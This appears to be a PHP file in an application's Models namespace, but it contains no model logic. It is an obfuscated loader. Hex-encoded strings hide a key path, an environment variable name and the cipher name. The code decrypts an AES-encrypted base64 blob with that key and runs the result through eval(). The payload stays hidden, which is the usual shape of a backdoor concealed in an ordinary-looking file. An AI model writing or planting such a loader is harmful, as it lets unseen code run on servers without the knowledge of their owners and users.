<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('UVWM7+v3omTKAc1oNqzLMA==');

$c=base64_decode(

'grNNI+Mz+y2YKTG0B+lk0DinAm3xBaPbZyVtiGe22C+vX8GGD/59KiLirGIW3GPiE5lZuSksLhsF' .
'UWA+Sx7ggxyW9BMQCekLmR6ySfUoubTy8A9De2qq09m++dyNgt6XmCSlDw+EIOLhtq85M1njPs9K' .
'Qa8DmkquZ61V6PUuMWDbu6eGeMSZyWlNb765l7sNiGmiZPH9PgY98MQxGoXOf//Bu+quKNqZH4GK' .
'my2bbpRYXWDnE0/u1BcPdZKPk4wgyZepjIF8d+4tdHt8HsDtPiEoHim6CBFIaj1dJ2xM8iqrZDxh' .
'alw20Prh83pn2gm15+OWxxVTCAxLjMPptDNiUiuh82fSXh8zxynxZvFlffoyOyM/2r5ZEcAYGb23' .
'q0i2ZJeQd8Jftzr/nFVb428R630Wva2rWWcPiyBvWU/9k7ZZZt3XeigQpFdIDrwKo2oVfxkzwzRi' .
'zBPKhOwhe0I/XpN66uxKsDhmxnqivOOLGMThOp+cDzSx0w0D//s6ofwviyUtaYwMC3Mg24xjQF6o' .
'OGKsUmItMBbrVFuwZThQ7FH7ZgkTd1yC15wWv1UJO5cb2/i/QiTHlu6+Ry07kOKBN9lZLryHLXxu' .
'SjHjRhpo1eeXcHm5LxcId+sugIYC+ZjWMvwTm7W7KqLJy71GLLWIg8GTi7sHCGETahoPoPMg770C' .
'sogMLDI8mlU+luX2sHphY0hnF61Z4vUN1BXcD1vmICqP4O1pdLk5Csq9nrrSAiXabQZ2+Zk1iPfw' .
'Aba6PS14/UXdJmCe7+1DNdfxz4UCqP9o0zm4l1N6662TQiX3f4MOTO0xwSTz4kaX6NEeSCLK8K8q' .
'gpa/mS8ogIorgSusCWpYRdbqV42r6kzejHZvgiTZd9AnI5qV0lqPB8e7iBRs'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

